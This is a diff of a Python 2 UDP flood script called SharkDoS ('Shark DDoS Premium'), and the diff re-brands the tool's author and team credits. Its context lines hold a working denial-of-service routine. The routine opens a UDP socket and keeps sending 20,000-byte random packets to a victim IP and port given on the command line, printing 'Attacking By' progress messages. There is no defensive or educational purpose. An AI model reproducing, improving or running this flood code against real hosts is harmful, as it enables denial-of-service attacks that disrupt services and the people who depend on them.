@@ -8,20 +8,20 @@ def usage():
     print "------------------------------------------------------------------------------------------------------------------------------"
     print "                 Command Run : " "python2 SharkDoS.py " "<ip> <port> <packet>"
     print "__________________________________________________________________________________"
-    print "Coded By : IYoonihXv"
-    print "Team : Xv Community"
+    print "Coded By : Vinz505"
+    print "Team : EXCUTED"
     print "Shark Attack Version : v1.0"
     print "__________________________________________________________________________________"
     print "================================================================"
     print "__________________________________________________________________________________"
     print "                                      <--[ Shark DDoS Premium ]-->                                                      "
     print "__________________________________________________________________________________"
-    print "                                                  Xv Community"
-    print "                              Support Me On Youtube IYoonih Dos :/"
+    print "                                                  EXCUTED"
+    print "                              Support Me On Youtube Vinz505 Dos :/"
     print " __________________________________________________________________________________"
 def flood(victim, vport, duration):
     # Don't Leaked This Tools
-    # Tools By IYoonihVx
+    # Tools By Vinz505
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # Run 20000 Packet
     bytes = random._urandom(20000)
@@ -35,7 +35,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mAttacking By IYoonih \033[1;32m%s \033[1;91mSending Packet \033[1;32m%s \033[1;91mTo Port \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mAttacking By Vinz505 \033[1;32m%s \033[1;91mSending Packet \033[1;32m%s \033[1;91mTo Port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
